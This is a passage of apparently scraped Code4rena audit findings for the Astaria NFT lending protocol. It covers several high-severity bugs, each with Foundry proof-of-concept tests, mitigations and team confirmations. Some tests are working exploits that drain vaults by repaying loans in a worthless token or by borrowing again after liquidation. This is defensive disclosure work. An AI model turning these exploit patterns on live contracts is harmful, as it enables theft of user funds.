\"../interfaces/IVaultImplementation.sol\";\n\n\n\ncontract AstariaTest is TestHelpers {\n  using FixedPointMathLib for uint256;\n  using CollateralLookup for address;\n  using SafeCastLib for uint256;\n\n\n  ILienToken.Details public lienDetails =\n      ILienToken.Details({\n        maxAmount: 50 ether,\n        rate: (uint256(1e16) * 150) / (365 days),\n        duration: 10 days,\n        maxPotentialDebt: 50 ether,\n        liquidationInitialAsk: 500 ether\n      });\n\n\n  function __createPrivateVault(address strategist, address delegate,address token)\n    internal\n    returns (address privateVault)\n  {\n    vm.startPrank(strategist);\n    privateVault = ASTARIA_ROUTER.newVault(delegate, token);\n    vm.stopPrank();\n  }    \n\n  \n function testPayWithDifferentAsset() public {\n    TestNFT nft = new TestNFT(2);\n    address tokenContract = address(nft);\n    uint256 initialBalance = WETH9.balanceOf(address(this));\n\n    // Create a private vault with WETH asset\n    address privateVault = __createPrivateVault({\n      strategist: strategistOne,\n      delegate: address(0),\n      token: address(WETH9)\n    });\n\n\n    _lendToPrivateVault(\n      Lender({addr: strategistOne, amountToLend: 500 ether}),\n      privateVault\n    );\n    \n    // Send the NFT to Collateral contract and receive Collateral token\n    ERC721(tokenContract).safeTransferFrom(address(this),address(COLLATERAL_TOKEN),1,\"\");\n\n    // generate valid terms\n    uint256 amount = 50 ether; // amount to borrow        \n    IAstariaRouter.Commitment memory c = _generateValidTerms({\n      vault: privateVault,\n      strategist: strategistOne,\n      strategistPK: strategistOnePK,\n      tokenContract: tokenContract,\n      tokenId: 1,\n      lienDetails: lienDetails,\n      amount: amount,\n      stack: new ILienToken.Stack[](0)\n    });\n\n    // Attack starts here\n    // The borrower an asset which has no value in the market\n    MockERC20 FakeToken = new MockERC20(\"USDC\", \"FakeAsset\", 18); // this could be any ERC token created by the attacker\n    FakeToken.mint(address(this),500 ether);\n    // The borrower creates a private vault with his/her asset\n    address privateVaultOfBorrower = __createPrivateVault({\n      strategist: address(this),\n      delegate: address(0),\n      token: address(FakeToken)\n    });\n\n    uint8 i;\n    for( ; i < 10 ; i ++) {\n      // Here is the exploit: commitToLien on privateVault while passing differentVault in the strategy\n      c.lienRequest.strategy.vault = privateVaultOfBorrower;   \n      (uint256 lienId, ILienToken.Stack[] memory stack , uint256 payout) = IVaultImplementation(privateVault).commitToLien(\n          c,\n          address(this)\n      );\n      console.log(\"Take 50 ether loan#%d\", (i+1));\n\n      // necessary approvals\n      FakeToken.approve(address(TRANSFER_PROXY), amount);\n      FakeToken.approve(address(LIEN_TOKEN), amount);\n\n      // pay the loan with FakeToken \n      ILienToken.Stack[] memory newStack = LIEN_TOKEN.makePayment(\n        stack[0].lien.collateralId,\n        stack,\n        uint8(0),\n        amount\n      );\n      console.log(\"Repay 50 FakeToken loan#%d\", (i+1));\n    }\n\n\n    // assertion\n    console.log(\"------\");\n    // Vault is drained\n    console.log(\"PrivateVault Balance: %d WETH\", WETH9.balanceOf(privateVault));\n    assertEq(WETH9.balanceOf(privateVault), 0); \n    // The borrower gets 500 ether\n    console.log(\"Borrower Balance: %d WETH\", WETH9.balanceOf(address(this)));\n    assertEq(WETH9.balanceOf(address(this)), initialBalance + 500 ether);\n    // strategist receives the fake token\n    console.log(\"Strategist Balance: %d FakeToken\", FakeToken.balanceOf(strategistOne));\n    assertEq(FakeToken.balanceOf(strategistOne), 500 ether);\n\n  }\n \n}\n\n\n```\n\n3.  Then run the forge test command as follows (replace `$FORK_URL` with your RPC URL):\n\n```sh\n forge test --ffi --fork-url $FORK_URL --fork-block-number 15934974 --match-path src/test/StealAllFundsExploit.t.sol -vv\n```\n\nThe test will pass. I've added comments in the code explaining the steps.\n\n*Note:The attack isn't possible when using AstariaRouter*\n\n### Recommended Mitigation Steps\n\nIn VaultImplementation's `commitToLien` function, add the following validation:\n\n```sh\nrequire(address(this) == params.lienRequest.strategy.vault,\"INVALID VAULT\");\n```\n\nRun the PoC test above again, and `testPayWithDifferentAsset` should fail.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/409)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report outlines a scenario where a borrower can exploit a vulnerability in the code of the Astaria project, allowing them to take out loans and repay with any token, even one with no value in the market. This could result in the borrower stealing all the funds from all vaults that support their collateral. The exploit is possible due to a lack of validation in the VaultImplementation's commitToLien function. A proof of concept is included in the report which, when run, shows that the exploit is possible. To mitigate this issue, a validation has been added to the commitToLien function which will prevent the exploit from occurring. The mitigation has been confirmed by SantiagoGregory (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/409",
      "tags": [],
      "finders": [
        "bin2chen",
        "Koolex"
      ]
    },
    {
      "id": "25802",
      "title": "[H-07] Malicious refinancing attack could lead to suboptimal NFT liquidation",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L684>\n\nA malicious refinancing with a very low `liquidationInitialAsk` just prior to a liquidation event could result in an NFT being liquidated for a price much lower than what the borrower wanted when signing up for the loan. Because refinancing is permission less, anyone can do this close to liquidation event resulting in the user being compensated less than fair price for their NFT.\n\n### Proof of Concept\n\nRefinance checks are currently permission less, anyone can buyout a lien. This is fine because of the assumption that refinancing leads to a strictly optimal outcome in all cases to the borrower. This is true with respect to the loan duration, interest rate and overall debt parameters. However this is not the case with respect to the `liquidationInitialAsk` loan parameter.\n\nSee code in <https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L684> refinance checks do not take into account `liquidationInitialAsk` which is one of the loan parameters\n\nImagine a user takes a loan for 3 ETH against an NFT with a high `liquidationInitialAsk` of 100 ETH which is a fair value of the NFT to the user. If they are not able to pay off the loan in time, they are assured \\~97 ETH back assuming market conditions do not change. However a malicious refinancing done close to liquidation can set `liquidationInitialAsk` close to 0.\n\nThis is possible because:\n\n*   Refinancing is permission less\n*   Since it's close to liquidation, user has no time to react\n\nThe malicious liquidator just needs to pay off the debt of 3 ETH and a minimal liquidation fee. Further, since they are aware of the initial ask in the NFT auction, they may be able to purchase the NFT for a very low price. The liquidator profits and the initial borrower does not receive a fair market value for their collateral.\n\n### Recommended Mitigation Steps\n\n*   Add checks that `liquidationInitialAsk` does not decrease during a refinance. Or set a `minimumLiquidationPrice` which is respected across all refinances\n*   Don't allow refinances close to a liquidation event\n*   Don't allow loans / refinances less than a minimum duration. May prevent other classes of surprises as well.\n\n**[SantiagoGregory (Astaria) confirmed via duplicate issue `#470`](https://github.com/code-423n4/2023-01-astaria-findings/issues/470#event-8369735155)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a malicious refinancing issue that could occur in the AstariaRouter.sol code. The malicious refinancing issue happens when someone refinances a loan with a very low liquidationInitialAsk just prior to a liquidation event. This could result in an NFT being liquidated for a price much lower than what the borrower wanted when signing up for the loan, as refinancing is permission less. This would mean that the borrower would not receive a fair market value for their collateral.\n\nTo demonstrate the issue, the code in AstariaRouter.sol was referenced, which showed that refinance checks do not take into account liquidationInitialAsk. An example was given of a user taking a loan for 3 ETH against an NFT with a high liquidationInitialAsk of 100 ETH. If they are unable to pay off the loan in time, they are assured of 97 ETH back. However, if a malicious refinancing is done close to liquidation, the liquidationInitialAsk could be set close to 0, as refinancing is permission less and the user would have no time to react. This would mean that the malicious liquidator just needs to pay off the debt of 3 ETH and a minimal liquidation fee, and could purchase the NFT for a very low price, thus profiting at the expense of the borrower.\n\nTo mitigate this issue, the report recommends adding checks that liquidationInitialAsk does not decrease during a refinance, or setting a minimumLiquidationPrice which is respected across all refinances. Additionally, it suggests not allowing refinances close to a liquidation event, and not allowing loans/refinances less than a minimum duration. The report was confirmed by SantiagoGregory (Astaria) via issue #470.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/430",
      "tags": [],
      "finders": [
        "gtocoder",
        "peakbolt"
      ]
    },
    {
      "id": "25801",
      "title": "[H-06] Buying out corrupts the slope of a vault, reducing rewards of LPs",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L189><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L627-L628>\n\nAfter a buyout, the slope of a vault won't be increased. As a result, liquidity providers will lose reward for providing liquidity to borrowers and the borrower will not pay interest for the lien that was bought out.\n\n### Proof of Concept\n\nBuyout is an important refinancing mechanism that allows borrowers to apply new terms (e.g. changed loan rate and/our duration) to their loans. [The implementation of the mechanism](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313) allows borrower to repay the owed amount for a lien, burn the lien, and create a new lien. When burning and creating liens it's important to update [the slope of a vault](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L627-L628): is the total interest accrued by vaults. However, during a buyout the slope of the vault where a new lien is created is not increased:\n\n1.  after a new lien is created, the slope of the vault is not increased ([LienToken.sol#L127](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L127));\n2.  however, the slope of the vault is decreased after the old lien is burned ([LienToken.sol#L189](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L189), [PublicVault.sol#L627-L628](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L627-L628))\n\nSince, during a buyout, a lien with a different interest rate may be created (due to changed loan terms), the slope of the vault must be updated correctly:\n\n1.  the slope of the previous lien must be reduced from the total slope of the vault;\n2.  the slope of the new lien must be added to the total slope of the vault.\n\nIf the slope of the new lien is not added to the total slope of the vault, then the lien doesn't generate interest, which means the borrower doesn't need to pay interest for taking the loan and liquidity providers won't be rewarded for providing funds to the borrower.\n\nThe following PoC demonstrates that the slope of a vault is 0 after the only existing lien was bought out:\n\n```solidity\n// src/test/AstariaTest.t.sol\nfunction testBuyoutLienWrongSlope_AUDIT() public {\n  TestNFT nft = new TestNFT(1);\n  address tokenContract = address(nft);\n  uint256 tokenId = uint256(0);\n\n  uint256 initialBalance = WETH9.balanceOf(address(this));\n\n  // create a PublicVault with a 14-day epoch\n  address publicVault = _createPublicVault({\n    strategist: strategistOne,\n    delegate: strategistTwo,\n    epochLength: 14 days\n  });\n  vm.label(publicVault, \"PublicVault\");\n\n  // lend 50 ether to the PublicVault as address(1)\n  _lendToVault(\n    Lender({addr: address(1), amountToLend: 50 ether}),\n    publicVault\n  );\n\n  // borrow 10 eth against the dummy NFT\n  (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({\n    vault: publicVault,\n    strategist: strategistOne,\n    strategistPK: strategistOnePK,\n    tokenContract: tokenContract,\n    tokenId: tokenId,\n    lienDetails: standardLienDetails,\n    amount: 10 ether,\n    isFirstLien: true\n  });\n\n  // Right after the lien was created the slope of the vault equals to the slope of the lien.\n  assertEq(PublicVault(publicVault).getSlope(), LIEN_TOKEN.calculateSlope(stack[0]));\n\n  vm.warp(block.timestamp + 3 days);\n\n  IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({\n    vault: publicVault,\n    strategist: strategistOne,\n    strategistPK: strategistOnePK,\n    tokenContract: tokenContract,\n    tokenId: tokenId,\n    lienDetails: refinanceLienDetails,\n    amount: 10 ether,\n    stack: stack\n  });\n\n  (stack, ) = VaultImplementation(publicVault).buyoutLien(\n    stack,\n    uint8(0),\n    refinanceTerms\n  );\n\n  // After a buyout the slope of the vault is 0, however it must be equal to the slope of the lien.\n  // Error: a == b not satisfied [uint]\n  //  Expected: 481511019363\n  //  Actual: 0\n  assertEq(PublicVault(publicVault).getSlope(), LIEN_TOKEN.calculateSlope(stack[0]));\n\n  // A lien exists after the buyout, so the slope of the vault cannot be 0.\n  uint256 collId = stack[0].lien.collateralId;\n  assertEq(LIEN_TOKEN.getCollateralState(collId), bytes32(hex\"7c2c35af3fb5f00ff3995cdddd95dcbbad96eea7bca39b305f2d0f8a55d838f8\"));\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider increasing the slope of a public vault after a buyout, similarly to how it's done [after a new commitment](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L449).\n\n**[SantiagoGregory (Astaria) confirmed via duplicate issue `#366`](https://github.com/code-423n4/2023-01-astaria-findings/issues/366#event-8369739464)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is related to the Astaria protocol, which is a decentralized lending platform. Buyout is an important refinancing mechanism that allows borrowers to apply new terms (e.g. changed loan rate and/our duration) to their loans. During a buyout, a lien with a different interest rate may be created, but the slope of the vault is not increased. This means that the borrower does not need to pay interest for taking the loan, and liquidity providers won't be rewarded for providing funds to the borrower.\n\nA proof of concept is provided in the report, which demonstrates that the slope of a vault is 0 after the only existing lien was bought out. This is because the slope of the previous lien is not reduced from the total slope of the vault, and the slope of the new lien is not added to the total slope of the vault.\n\nThe recommended mitigation step is to consider increasing the slope of a public vault after a buyout, similarly to how it's done after a new commitment. This was confirmed by SantiagoGregory (Astaria) via duplicate issue `#366`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/477",
      "tags": [],
      "finders": [
        "cccz",
        "Jeiwan",
        "chaduke",
        "rvierdiiev",
        "obront"
      ]
    },
    {
      "id": "25800",
      "title": "[H-05] Vault may be drained after a liquidated NFT was claimed by the liquidator",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231>\n\nThe owner of a collateral NFT that was liquidated and then claimed by the liquidator (after the auction had no bids) may drain the vault the loan was taken from.\n\n### Proof of Concept\n\nThere's an extreme situation when a liquidated and auctioned collateral NFT had no bids and the auction has expired. In this situation, the liquidator may claim the NFT by calling [CollateralToken.liquidatorNFTClaim](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L109). The function:\n\n1.  calls [ClearingHouse.settleLiquidatorNFTClaim](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220) to burn the lien token associated with the loan and clean up the accounting without repaying the actual loan (the loan cannot be repaid since there were no bids);\n2.  [releases the collateral NFT to the liquidator](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L352).\n\nHowever, the function doesn't settle the auction. As a result:\n\n1.  the `CollateralToken` is not burned ([CollateralToken.sol#L538](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L538));\n2.  the link between the collateral ID and the underlying token is not removed ([CollateralToken.sol#L537](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L537));\n3.  the link between the collateral ID and the auction is also not removed ([CollateralToken.sol#L544](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L544)).\n\nThis allows the owner of the liquidated collateral NFT to create a new lien and take the maximal loan without providing any collateral.\n\n**Exploit Scenario**\n\n1.  Alice deposits an NFT token as a collateral and takes a loan.\n2.  Alice's loan expires and her NFT collateral gets liquidated by Bob.\n3.  The collateral NFT wasn't sold off auction as there were no bids.\n4.  Bob claims the collateral NFT and receives it.\n5.  Alice takes another loan from the vault without providing any collateral.\n\nThe following PoC demonstrates the above scenario:\n\n```solidity\n// src/test/AstariaTest.t.sol\nfunction testAuctionEndNoBidsMismanagement_AUDIT() public {\n  address bob = address(2);\n  TestNFT nft = new TestNFT(6);\n  uint256 tokenId = uint256(5);\n  address tokenContract = address(nft);\n\n  // Creating a public vault and providing some liquidity.\n  address publicVault = _createPublicVault({\n    strategist: strategistOne,\n    delegate: strategistTwo,\n    epochLength: 14 days\n  });\n\n  _lendToVault(Lender({addr: bob, amountToLend: 150 ether}), publicVault);\n  (, ILienToken.Stack[] memory stack) = _commitToLien({\n    vault: publicVault,\n    strategist: strategistOne,\n    strategistPK: strategistOnePK,\n    tokenContract: tokenContract,\n    tokenId: tokenId,\n    lienDetails: blueChipDetails,\n    amount: 100 ether,\n    isFirstLien: true\n  });\n\n  uint256 collateralId = tokenContract.computeId(tokenId);\n  vm.warp(block.timestamp + 11 days);\n\n  // Liquidator liquidates the loan after expiration.\n  address liquidator = address(0x123);\n  vm.prank(liquidator);\n  OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(\n    stack,\n    uint8(0)\n  );\n\n  // Skipping the auction duration and making no bids.\n  skip(4 days);\n\n  // Liquidator claims the liquidated NFT.\n  vm.prank(liquidator);\n  COLLATERAL_TOKEN.liquidatorNFTClaim(listedOrder);\n  PublicVault(publicVault).processEpoch();\n\n  // Liquidator is the rightful owner of the collateral NFT.\n  assertEq(nft.ownerOf(tokenId), address(liquidator));\n\n  // Since the auction wasn't fully settled, the CollateralToken still exists for the collateral NFT.\n  // The borrower is the owner of the CollateralToken.\n  assertEq(COLLATERAL_TOKEN.ownerOf(collateralId), address(this));\n\n  // WETH balances at this moment:\n  // 1. the borrower keep holding the 100 ETH it borrowed earlier;\n  // 2. the vault keeps holding 50 ETH of liquidity.\n  assertEq(WETH9.balanceOf(address(this)), 100 ether);\n  assertEq(WETH9.balanceOf(address(publicVault)), 50 ether);\n\n  // The borrower creates another lien. This time, the borrower is not the owner of the collateral NFT.\n  // However, it's still the owner of the CollateralToken.\n  (, stack) = _commitToLien({\n    vault: publicVault,\n    strategist: strategistOne,\n    strategistPK: strategistOnePK,\n    tokenContract: tokenContract,\n    tokenId: tokenId,\n    lienDetails: blueChipDetails,\n    amount: 50 ether,\n    isFirstLien: true\n  });\n\n  // The borrower has taken a loan of 50 ETH from the vault.\n  assertEq(WETH9.balanceOf(address(this)), 150 ether);\n  // The vault was drained.\n  assertEq(WETH9.balanceOf(address(publicVault)), 0 ether);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider settling the auction at the end of `settleLiquidatorNFTClaim`:\n\n```diff\ndiff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol\nindex 5c2a400..d4ee28d 100644\n--- a/src/ClearingHouse.sol\n+++ b/src/ClearingHouse.sol\n@@ -228,5 +228,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {\n       0,\n       s.auctionStack.stack\n     );\n+    uint256 collateralId = _getArgUint256(21);\n+    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);\n   }\n }\n```\n\n**[androolloyd (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/480)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Astaria protocol, which allows the owner of a liquidated collateral NFT to drain the vault the loan was taken from. The vulnerability is caused by a lack of settlement of the auction at the end of the function 'settleLiquidatorNFTClaim' which is called when the liquidator claims the collateral NFT.\n\nThe proof of concept provided in the report demonstrates the exploit scenario. This begins with Alice depositing an NFT token as a collateral and taking a loan. When the loan expires and her NFT collateral gets liquidated, the collateral NFT wasn't sold off auction as there were no bids. The liquidator then claims the collateral NFT and receives it, and Alice is able to take another loan from the vault without providing any collateral.\n\nThe recommended mitigation step is to consider settling the auction at the end of 'settleLiquidatorNFTClaim' by adding the code provided to the function. This was confirmed by androolloyd (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/480",
      "tags": [],
      "finders": [
        "HE1M",
        "Jeiwan",
        "obront"
      ]
    },
    {
      "id": "25799",
      "title": "[H-04] Strategist can fail to withdraw asset token from a private vault",
      "impact": "HIGH",
      "content": "\n<https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73>\n\nCalling the `AstariaRouter.withdraw` function calls the following `ERC4626RouterBase.withdraw` function; however, calling `ERC4626RouterBase.withdraw` function for a private vault reverts because the `Vault` contract does not have an `approve` function. Directly calling the `Vault.withdraw` function for a private vault can also revert since the `Vault` contract does not have a way to set the allowance for itself to transfer the asset token, which can cause many ERC20 tokens' `transferFrom` function calls to revert when deducting the transfer amount from the allowance. Hence, after depositing some of the asset token in a private vault, the strategist can fail to withdraw this asset token from this private vault and lose this deposit.\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52>\n\n```solidity\n  function withdraw(\n    IERC4626 vault,\n    address to,\n    uint256 amount,\n    uint256 maxSharesOut\n  ) public payable virtual override returns (uint256 sharesOut) {\n\n    ERC20(address(vault)).safeApprove(address(vault), amount);\n    if ((sharesOut = vault.withdraw(amount, to, msg.sender)) > maxSharesOut) {\n      revert MaxSharesError();\n    }\n  }\n```\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73>\n\n```solidity\n  function withdraw(uint256 amount) external {\n    require(msg.sender == owner());\n    ERC20(asset()).safeTransferFrom(address(this), msg.sender, amount);\n  }\n```\n\n### Proof of Concept\n\nPlease add the following test in `src\\test\\AstariaTest.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n  function testPrivateVaultStrategistIsUnableToWithdraw() public {\n    uint256 amountToLend = 50 ether;\n    vm.deal(strategistOne, amountToLend);\n\n    address privateVault = _createPrivateVault({\n      strategist: strategistOne,\n      delegate: strategistTwo\n    });\n\n    vm.startPrank(strategistOne);\n\n    WETH9.deposit{value: amountToLend}();\n    WETH9.approve(privateVault, amountToLend);\n\n    // strategistOne deposits 50 ether WETH to privateVault\n    Vault(privateVault).deposit(amountToLend, strategistOne);\n\n    // calling router's withdraw function for withdrawing assets from privateVault reverts\n    vm.expectRevert(bytes(\"APPROVE_FAILED\"));\n    ASTARIA_ROUTER.withdraw(\n      IERC4626(privateVault),\n      strategistOne,\n      amountToLend,\n      type(uint256).max\n    );\n\n    // directly withdrawing various asset amounts from privateVault also fails\n    vm.expectRevert(bytes(\"TRANSFER_FROM_FAILED\"));\n    Vault(privateVault).withdraw(amountToLend);\n\n    vm.expectRevert(bytes(\"TRANSFER_FROM_FAILED\"));\n    Vault(privateVault).withdraw(1);\n\n    vm.stopPrank();\n  }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L72> can be updated to the following code.\n\n```solidity\n    ERC20(asset()).safeTransfer(msg.sender, amount);\n```\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/489)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with a smart contract called AstariaRouter. The issue is that when calling the AstariaRouter.withdraw function, it calls the ERC4626RouterBase.withdraw function, which can cause the transferFrom function calls to revert when deducting the transfer amount from the allowance. This can cause the strategist to fail to withdraw the asset token from the private vault and lose the deposit.\n\nThe recommended mitigation steps are to update the code in the Vault.sol file from ERC20(asset()).safeTransferFrom(address(this), msg.sender, amount); to ERC20(asset()).safeTransfer(msg.sender, amount);. This was confirmed by SantiagoGregory (Astaria).\n\nIn order to demonstrate the issue, a test was added to the AstariaTest.t.sol file. This test passes to show the described scenario. The tools used for this bug report were VSCode.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/489",
      "tags": [],
      "finders": [
        "Apocalypto",
        "rbserver",
        "Jeiwan",
        "jesusrod15",
        "ladboy233",
        "evan",
        "m9800"
      ]
    },
    {
      "id": "25798",
      "title": "[H-03] Improper validations in Clearinghouse, possible to lock collateral NFT in contract",
      "impact": "HIGH",
      "content": "\nWhen a borrower does not return the borrowed funds on time, a liquidator can trigger a liquidation.<br>\nIn that case the collateral NFT will be listed in an Seaport dutch auction.<br>\nThe auction requests settlementToken and a fake ClearingHouse NFT.<br>\nWhen a buyer bids enough of the settlementToken, openSea auction will accept the offer, transfer the NFT from ClearingHouse to bidder, move settlementToken from bidder to ClearingHouse, and 'transfers' the fake clearinghouse NFT to clearinghouse. This call to [ClearingHouse.safeTransferFrom](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L169-L178) triggers the further processing of the liquidation. It will pay the debt with the funds received from Seaport, and delete data from LienToken and CollateralToken for this collateral NFT.\n\nThe problem is that the `ClearingHouse.safeTransferFrom` can be called by anyone and assumes valid call parameters. One of the parameters `identifier` is used to pass the paymentToken address. This can easily be modified to let the contract accept any ERC20 token as `paymentToken` to payoff the debt.<br>\nThis allows a malicious actor to lock a user's collateral NFT and cancel the auction.<br>\nThis could be misused to completely block any liquidatons.\n\nThe steps to reproduce:\n\n1. Normal flow: borrow funds via requestLienPosition\n2. borrowed funds are not paid back before stack.point.end \n3. liquidator calls AstariaRouter.liquidate(...)\n\nAt this time a Seaport auction is initiated and CollateralToken state for this collateralID is updated to be in auction. \nAll fine so far.\n\n4. An evil actor can now call ClearingHouse.safeTransferFrom with dummy data and a dummy ERC20  token address as paymentToken\n\nAfter this call, the Collateral NFT will still be in de ClearingHouse contract, but references to the NFT are cleaned up from both CollateralToken and LienToken.\nThis results in the NFT being locked in the contract without any way to get it out.\n\n### Technical details\n\nWhen a liquidation is started, [\\_generateValidOrderParameters](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L425) is called to generate the Seaport order params. It sets [settlementToken as the identifierOrCriteria](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L456).\n\nClearingHouse assumes that `safeTransferFrom` will only be called by Seaport after a succesful auction, and assumes the identifier is the `settlementToken` value that was set for the order.<br>\nThe \\_execute function is called, which [converts the identifier parameter to a paymentToken address](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L123) and checks if the received amount of paymentToken is >= the expected auction currentOfferPrice it accepts the call and moves the token balance to the correct addresses.<br>\nIt then calls [LienToken.payDebtViaClearingHouse](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L497-L510), passing the fake `paymentToken` as a parameter.<br>\nLientoken contract also does not verify if the token is ineed the correct settlementToken and pays off the debt with the fake token balance.<br>\nIt then deletes the [collateralStateHash](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L509) for the collateralId, removing the stack state.\n\nAfter that,  `CollateralToken.settleAuction` is called, which [burns the token](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L538) for collateralId and [deletes idToUnderlying](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L537) and [collateralIdToAuction](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L544) for this collateralId.\n\nWe now have a state where the collateral NFT is in the ClearingHouse contract, but all actions are made impossible, because the state in the token contracts are removed.\n`CollateralToken.ownerOf(collateralID)` reverts because the entry in `s.idToUnderlying` was removed.<br>\nThis causes `releaseToAddress()` and `flashAction()` to fail.<br>\n`liquidatorNFTClaim` fails because `s.collateralIdToAuction` was cleared.<br>\nTrying to create a new Lien also fails as that calls `CollateralToken.ownerOf(collateralID)`.\n\n### Proof of concept\n\nTo test the scenario, I have modified the testLiquidationNftTransfer test in AstariaTest.t.sol\n\n```diff\ndiff --git a/src/test/AstariaTest.t.sol b/src/test/AstariaTest.t.sol\nindex c7ce162..bfaeca6 100644\n--- a/src/test/AstariaTest.t.sol\n+++ b/src/test/AstariaTest.t.sol\n@@ -18,6 +18,7 @@ import \"forge-std/Test.sol\";\n import {Authority} from \"solmate/auth/Auth.sol\";\n import {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n import {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\";\n+import {MockERC20} from \"solmate/test/utils/mocks/MockERC20.sol\";\n import {\n   MultiRolesAuthority\n } from \"solmate/auth/authorities/MultiRolesAuthority.sol\";\n@@ -1030,8 +1031,19 @@ contract AstariaTest is TestHelpers {\n       uint8(0)\n     );\n     vm.stopPrank();\n-    uint256 bid = 100 ether;\n-    _bid(Bidder(bidder, bidderPK), listedOrder, bid);\n+\n+    uint256 collateralId = tokenContract.computeId(tokenId);\n+    ClearingHouse CH = COLLATERAL_TOKEN.getClearingHouse(collateralId);\n+\n+   